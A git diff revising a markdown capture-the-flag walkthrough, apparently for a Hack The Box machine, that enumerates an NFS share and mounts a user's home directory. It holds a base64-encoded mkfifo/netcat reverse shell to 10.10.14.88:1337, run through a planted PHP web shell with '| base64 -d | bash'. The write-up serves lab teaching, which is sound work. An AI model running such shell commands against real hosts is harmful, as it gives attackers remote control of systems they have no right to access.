@@ -56,7 +56,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 26.17 seconds
 ```
 
-A lot of information is returned from our nmap scan, but port 2049 looks interesting. It is a NFS share, lets check it out!
+A lot of information is returned from our nmap scan, and after checking out port 80 the website is static and not very interesting, but port 2049 looks intriguing. It is a NFS share we can list them using `showmount`.
 
 ```bash
 showmount -e $IP
@@ -70,7 +70,7 @@ Awesome we can see a users home folder & the web root directory!
 Now lets try and mount them, and see what information we can gather.
 
 ```bash
-sudo mount -t nfs 10.129.40.85:/home/ross /mnt/squashed -o nolock
+sudo mount -t nfs $IP:/home/ross /mnt/squashed -o nolock
 
 cd /mnt/squashed && ls -la
 
@@ -167,19 +167,20 @@ Now that we have command execution, lets go for a reverse shell.
 I will use the mkfifo shell from https://highon.coffee/blog/reverse-shell-cheat-sheet/
 and base64 encode it.
 
-After base64 encoding the reverse shell we should have a string that looks like this
+After base64 encoding the reverse shell we should have a string that looks like this:
+
 `bWtmaWZvIC90bXAvbG9sO25jIDEwLjEwLjE0Ljg4IDEzMzcgMDwvdG1wL2xvbCB8IC9iaW4vc2ggLWkgMj4mMSB8IHRlZSAvdG1wL2xvbCAK`
 
 Now lets see if we catch a shell.
 
-Before we run our reverse shell we must stat a listener
+Before we run our reverse shell we must start a listener
 
 ```bash
 nc -lvnp $port
 listening on [any] $port ...
 ```
 
-navigating back to the site, and using our payload put (you must replace the b64 encoded string with yours):
+navigating back to the site, and using entering our command:
 
 `/pwnd.php?cmd=echo bWtmaWZvIC90bXAvbG9sO25jIDEwLjEwLjE0Ljg4IDEzMzcgMDwvdG1wL2xvbCB8IC9iaW4vc2ggLWkgMj4mMSB8IHRlZSAvdG1wL2xvbCAK | base64 -d | bash`
 
